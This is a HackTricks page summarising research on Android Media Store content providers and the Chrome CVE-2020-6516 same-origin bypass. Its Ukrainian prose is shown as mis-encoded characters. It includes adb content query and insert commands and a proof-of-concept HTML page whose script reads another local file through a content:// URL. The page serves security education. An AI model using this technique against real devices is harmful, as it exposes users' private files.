{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**–¶–µ —Ä–µ–∑—é–º–µ –ø–æ—Å—Ç—É [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### –ü–µ—Ä–µ–ª—ñ–∫ —Ñ–∞–π–ª—ñ–≤ —É Media Store
–©–æ–± –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏, —è–∫—ñ –∫–µ—Ä—É—é—Ç—å—Å—è Media Store, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É –Ω–∏–∂—á–µ:
```bash
$ content query --uri content://media/external/file
```
–î–ª—è –±—ñ–ª—å—à –∑—Ä—É—á–Ω–æ–≥–æ –¥–ª—è –ª—é–¥–∏–Ω–∏ –≤–∏–≤–æ–¥—É, —â–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –ª–∏—à–µ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ç–∞ —à–ª—è—Ö –¥–æ –∫–æ–∂–Ω–æ–≥–æ –ø—Ä–æ—ñ–Ω–¥–µ–∫—Å–æ–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
–ö–æ–Ω—Ç–µ–Ω—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä–∏ —ñ–∑–æ–ª—å–æ–≤–∞–Ω—ñ —É –≤–ª–∞—Å–Ω–æ–º—É –ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω. –î–æ—Å—Ç—É–ø –¥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ –≤–∏–º–∞–≥–∞—î —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–æ–≥–æ `content://` URI. –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —à–ª—è—Ö–∏ –¥–æ—Å—Ç—É–ø—É –¥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑ –º–∞–Ω—ñ—Ñ–µ—Å—Ç—ñ–≤ –¥–æ–¥–∞—Ç–∫—ñ–≤ –∞–±–æ –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É —Ñ—Ä–µ–π–º–≤–æ—Ä–∫—É Android.

### –î–æ—Å—Ç—É–ø Chrome –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä—ñ–≤
Chrome –Ω–∞ Android –º–æ–∂–µ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä—ñ–≤ —á–µ—Ä–µ–∑ —Å—Ö–µ–º—É `content://`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –π–æ–º—É –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ—ñ—ó –∞–±–æ –¥–æ–∫—É–º–µ–Ω—Ç–∏, –µ–∫—Å–ø–æ—Ä—Ç–æ–≤–∞–Ω—ñ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ–º–∏ –¥–æ–¥–∞—Ç–∫–∞–º–∏. –©–æ–± –ø—Ä–æ—ñ–ª—é—Å—Ç—Ä—É–≤–∞—Ç–∏ —Ü–µ, —Ñ–∞–π–ª –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–≤–∏—Ç–∏ –≤ Media Store, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ Chrome:

–í—Å—Ç–∞–≤—Ç–µ –≤–ª–∞—Å–Ω–∏–π –∑–∞–ø–∏—Å —É Media Store:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
–í–∏–∑–Ω–∞—á—Ç–µ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –Ω–æ–≤–æ–≤—Å—Ç–∞–≤–ª–µ–Ω–æ–≥–æ —Ñ–∞–π–ª—É:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
–§–∞–π–ª –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –≤ Chrome, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ URL, –ø–æ–±—É–¥–æ–≤–∞–Ω–∏–π –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ —Ñ–∞–π–ª—É.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ–± –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º –¥–æ–¥–∞—Ç–∫–æ–º:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: –û–±—Ö—ñ–¥ –ø–æ–ª—ñ—Ç–∏–∫–∏ –æ–¥–Ω–∞–∫–æ–≤–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è

–ü–æ–ª—ñ—Ç–∏–∫–∞ _–æ–¥–Ω–∞–∫–æ–≤–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è_ (SOP) —î –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º –±–µ–∑–ø–µ–∫–∏ –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö, —è–∫–∏–π –æ–±–º–µ–∂—É—î –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ —É –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ —Ä–µ—Å—É—Ä—Å–∞–º–∏ –∑ —Ä—ñ–∑–Ω–∏—Ö –ø–æ—Ö–æ–¥–∂–µ–Ω—å, —è–∫—â–æ —Ü–µ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ —è–≤–Ω–æ –ø–æ–ª—ñ—Ç–∏–∫–æ—é Cross-Origin-Resource-Sharing (CORS). –¶—è –ø–æ–ª—ñ—Ç–∏–∫–∞ –º–∞—î –Ω–∞ –º–µ—Ç—ñ –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏—Ç–æ–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç–∞ –ø—ñ–¥—Ä–æ–±—Ü—ñ –º—ñ–∂—Å–∞–π—Ç–æ–≤–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤. Chrome –≤–≤–∞–∂–∞—î `content://` –ª–æ–∫–∞–ª—å–Ω–æ—é —Å—Ö–µ–º–æ—é, —â–æ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –±—ñ–ª—å—à —Å—É–≤–æ—Ä—ñ –ø—Ä–∞–≤–∏–ª–∞ SOP, –¥–µ –∫–æ–∂–µ–Ω URL –ª–æ–∫–∞–ª—å–Ω–æ—ó —Å—Ö–µ–º–∏ —Ä–æ–∑–≥–ª—è–¥–∞—î—Ç—å—Å—è —è–∫ –æ–∫—Ä–µ–º–µ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è.

–û–¥–Ω–∞–∫ CVE-2020-6516 –±—É–ª–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é –≤ Chrome, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è–ª–∞ –æ–±—ñ–π—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞ SOP –¥–ª—è —Ä–µ—Å—É—Ä—Å—ñ–≤, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö —á–µ—Ä–µ–∑ URL `content://`. –§–∞–∫—Ç–∏—á–Ω–æ, JavaScript-–∫–æ–¥ –∑ URL `content://` –º—ñ–≥ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—à–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö —á–µ—Ä–µ–∑ URL `content://`, —â–æ —Å—Ç–∞–Ω–æ–≤–∏–ª–æ –∑–Ω–∞—á–Ω—É –∑–∞–≥—Ä–æ–∑—É –±–µ–∑–ø–µ—Ü—ñ, –æ—Å–æ–±–ª–∏–≤–æ –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—è—Ö Android, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤–µ—Ä—Å—ñ—è—Ö —Ä–∞–Ω—ñ—à–µ Android 10, –¥–µ –Ω–µ –±—É–ª–æ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –æ–±–º–µ–∂–µ–Ω–µ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è.

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –¥–æ–∫–∞–∑ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—ó, —è–∫–∏–π –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –¥–µ HTML-–¥–æ–∫—É–º–µ–Ω—Ç, –ø—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø—ñ–¥ **/sdcard** —Ç–∞ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–æ Media Store, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `XMLHttpRequest` —É —Å–≤–æ—î–º—É JavaScript –¥–ª—è –¥–æ—Å—Ç—É–ø—É —Ç–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤–º—ñ—Å—Ç—É —ñ–Ω—à–æ–≥–æ —Ñ–∞–π–ª—É –≤ Media Store, –æ–±—Ö–æ–¥—è—á–∏ –ø—Ä–∞–≤–∏–ª–∞ SOP.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
